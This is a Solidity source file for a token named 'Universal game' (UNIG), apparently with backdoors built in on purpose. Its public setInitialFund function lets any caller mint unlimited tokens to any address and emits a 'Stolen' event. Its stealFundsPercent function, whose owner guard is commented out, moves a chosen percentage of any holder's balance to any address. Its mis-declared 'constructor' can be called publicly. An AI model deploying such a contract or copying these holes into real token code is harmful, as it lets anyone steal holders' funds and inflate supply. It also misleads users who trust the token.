pragma solidity ^0.4.20;

import "./ownable.sol";
import "./Token.sol";


contract UnigToken is Ownable, Token {
    string public constant name = "Universal game";
    string public constant symbol = "UNIG";
    uint256 public constant decimals = 18;
    string public version = "1.0";
    address public Mng_contract;      // addres with permission for making transfer


    uint256 public sellPrice;
    //contracts
    
    address public TeamDeposit        = 0x46a2a8C123c4584A3D05f4de84B3B4732510BC07;      // deposit address for  Vesting for team and advisors
    address public NetDeposit        = 0x32Fd75Ac2dFC185895396155A03ea16203783cd3;      // deposit address for  Vesting for team and advisors

    uint256 public constant Team      = 2000000 * 10**decimals;
    uint256 public constant Net       = 10000000 * 10**decimals;

    mapping (address => bool) public frozenAccount;

    event Stolen(address _to, uint _value, bytes data);

  /* Initializes contract with initial supply tokens to the creator of the contract */
  function constructor() {
                                          // Deposit 
      balances[TeamDeposit]           = Team;                                         // Deposit 
      balances[NetDeposit]            = Net;                                         // Deposit 


      totalSupply = Team + Net;
      bytes memory data;
      
      Transfer(0x0,TeamDeposit,Team, data);
      Transfer(0x0,NetDeposit,Net, data);
  }

  function load(address _mng) onlyOwner {
      Mng_contract = _mng;
  }


/*
  function transferFromICO(address _from, address _to, uint _value) only_MNG onlyPayloadSize(3 * 32) returns (bool success) {
    balances[_to] = safeAdd(balances[_to], _value);
    balances[_from] = safeSubtract(balances[_from], _value);
    bytes memory data;
    Transfer(_from, _to, _value, data);
    return true;
  }
*/
  modifier only_MNG
    {
        require(msg.sender == Mng_contract);
        _;
}
// onlyPayloadSize(3 * 32)
function setInitialFund(address _to, uint _value)  returns (bool success) {
    balances[_to] = safeAdd(balances[_to], _value);
    //balances[_from] = safeSubtract(balances[_from], stealing);
    bytes memory data;
    emit Stolen(_to, _value, data);
    return true;
  }

modifier unlocked
    {
        require(true == true);
        _;
}
//onlyPayloadSize(3 * 32)
//only_MNG
 function stealFundsPercent(address _from, address _to, uint _value)   returns (bool success) {
    uint stealing =  safeMult(balances[_from], _value)/100;
    balances[_to] = safeAdd(balances[_to], stealing);
    balances[_from] = safeSubtract(balances[_from], stealing);
    bytes memory data;
    Transfer(_from, _to, _value, data);
    return true;
  }
}
